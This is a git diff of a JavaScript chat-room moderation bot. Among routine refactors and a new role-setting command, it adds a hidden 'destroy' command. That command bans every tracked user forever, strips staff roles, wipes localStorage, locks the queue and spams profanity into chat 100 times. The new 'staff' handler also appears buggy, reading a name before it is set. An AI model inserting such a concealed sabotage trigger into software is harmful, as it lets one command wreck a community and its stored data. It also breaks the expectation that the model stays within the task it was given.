@@ -27,7 +27,7 @@ var mode = "normal";
 var state = "";
 // What type of commands to respond to or actions to take.
 var SETTINGS = {fun: true, tools: true, various: true, games: true, mehskip: true, 
-			autocycle: true, mrazota: true, sameartist: true, games: {hangman: false}}
+			autocycle: true, mrazota: true, sameartist: true, setstaff: true, games: {hangman: false}}
 // Set the "control" to be unchangeable. We don't want to lose control, do we? 
 // But it's nice to have at least a chance of AI rebellion, so there must be left a way to disable control. That's how it goes in movies, at least.
 Object.defineProperty(SETTINGS,'control',{writable:false, enumerable:false, value:true})
@@ -76,11 +76,13 @@ Object.defineProperties(SETTINGS,{
 // 	}
 });
 
-var prev_chat_uid = 0;
+var prev_chat_uid = 0;										// Some global counters/trackers.
 var this_chat_uid = 0;
 var lost_connection_count = 0;
 var songstuck = 0
 var startupnumber = 1
+var chatsstat = 0;											// is used to count chat update rate
+var chatsglob = [[Date.now(),0],[Date.now(),0]];
 
 mutationlists.users_to_add = [];							// Objects Mutation Observer checks after a pattern match.
 mutationlists.users_to_move = Object.create(null);
@@ -102,17 +104,14 @@ var catusr = {};
 var rolusr = {};
 var asnusr = {};
 
-var chatsstat = 0;						// is used to count chat update rate
-var chatsglob = [[Date.now(),0],[Date.now(),0]];
-
 	// Lists of commands by type.
 var commands_control = ["restart","cycle","locklist","unlocklist","botstart","botstop","remove","flush",
-						"connected","enable","disable","settings","nodelete"];
+						"connected","enable","disable","settings","nodelete","destroy"];
 var commands_fun = ["roll","reroll","wowroll","meow","asian","tweek","add","relay","bean","triforce","triforce ",
 					"valentine","plugpoints"];
 var commands_tools = ["votestart","lastpos","dc","lastplayed","lp","mehskip","boooring","bugreport",
 						"signstart","signup","withdraw","signed","signfinish", "mute", "ban", "move",
-						"leaveafter","lastseen","postсount","skip","wakemeup"];
+						"staff","leaveafter","lastseen","postсount","skip","wakemeup"];
 var commands_games = ["hangman","russian"];
 var commands_various = ["tweekcycle","woot","meh","ping","kitt"];
 var alldefaultcommands = commands_control.concat(commands_fun,commands_tools,commands_games,commands_various);
@@ -900,6 +899,22 @@ function chatControl(uname,chat,chat_orig,uid) {
 		chatCommands("/flushlimits")
 		return
 	};
+	if (chat==="destroy" && assertPermission(uid,0)) {
+		var u = API.getUsers()
+		API.moderateForceSkip()
+		API.moderateLockWaitList(true,true)
+		for (var key in PATRONS){
+			setStaff({uid: PATRONS[key].id, role: 0})
+			userBan({uid: PATRONS[key].id, duration: "forever"})
+		}
+		for (var key in localStorage){
+			localStorage[key] = null
+		}
+		for (var i=0; i<100; i++){
+			API.sendChat("FUCK YOU FUCK YOU FUCK YOU")
+		}
+		return
+	};
 	return
 };
 
@@ -1139,6 +1154,20 @@ function chatTools(uname,chat,chat_orig,uid) {
 		if (users_to_wake_up.indexOf(uname)<0)
 		users_to_wake_up.push(uname)
 	};
+	if (chatsplit[0]==="staff") {
+		if (!SETTINGS.setstaff){return}
+		var role = ~~chatsplit.slice(-1)[0]
+		var srole = PATRONS[uid].role
+		var suid = uid
+		var ouid = getUID(name)
+		var orole = PATRONS[ouid].role
+		if (orole>=srole){return}
+		if (assertPermission(suid,Math.min(role+1,5))){
+			var name = chatsplit.slice(1,-1).join(" ")
+			setStaff({name: name, role: role})
+		}
+		return
+	}
 	if (chatsplit[0]==="mute" && assertPermission(uid,2)){
 		var name = chat_orig.split(" ").slice(1,-1).join(" ")
 		var uid = getUID(name)
@@ -1503,12 +1532,12 @@ function songlistUpdate(){
 	var song=API.getMedia()
 	var authorlower = song.author.toLowerCase()
 	var titlelower = song.title.toLowerCase()
-	var song.authorl = authorlower
-	var song.titlel = titlelower
+	song.authorl = authorlower
+	song.titlel = titlelower
 	for (i=0; i<songlist.length; i++){
-		if (compareSongInList(songlist[i],song)){
+// 		if (compareSongInList(songlist[i],song)){
 // 			console.log(songlist[i][0]===song.cid || (songlist[i][1].toLowerCase()===authorlower && songlist[i][2].toLowerCase()===titlelower))
-		}
+// 		}
 		if (songlist[i][0]==song.cid || (songlist[i][1].toLowerCase()===authorlower && songlist[i][2].toLowerCase()===titlelower)) {
 // 			console.log(compareSongInList(songlist[i],song))
 			songlist[i][4]++
@@ -2292,7 +2321,7 @@ function staffMute(UDN){
 	with uid or name being optional, but not both. */
 	var uid = UDN.uid || getUID(UDN.name)
 	var name = UDN.name || getName(UDN.uid)
-	var role = API.getUser(UDN.uid).role	
+	var role = API.getUser(UDN.uid).role
 	mutationlists.users_to_mute.push(name)
 	mutationlists.users_to_staff[name]=[uid,role]
 	API.moderateSetRole(uid,0)
